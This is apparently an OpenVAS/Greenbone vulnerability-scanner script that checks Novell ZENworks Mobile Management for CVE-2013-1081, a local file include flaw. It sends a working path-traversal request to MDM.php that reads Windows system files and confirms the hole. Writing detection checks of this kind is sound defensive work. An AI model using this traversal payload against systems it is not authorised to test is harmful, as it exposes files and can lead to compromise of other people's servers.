CPE = "cpe:/a:novell:zenworks_mobile_management";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103734" );
	script_bugtraq_id( 58402 );
	script_cve_id( "CVE-2013-1081" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Novell ZENworks Mobile Management Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/58402" );
	script_xref( name: "URL", value: "http://www.novell.com/support/kb/doc.php?id=7011895" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-10 13:05:34 +0200 (Mon, 10 Jun 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_novell_zenworks_mobile_management_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "zenworks_mobile_management/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory
  for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Novell ZENworks Mobile Management is prone to a local file include
  vulnerability because it fails to adequately validate user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts. This could allow the attacker to
  compromise the application and the computer. Other attacks are also possible." );
	script_tag( name: "affected", value: "Novell ZENworks Mobile Management 2.6.0, 2.6.1 and 2.7.0 are vulnerable." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = "/mobile/MDM.php?language=res/languages/" + crap( data: "../", length: 6 * 9 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

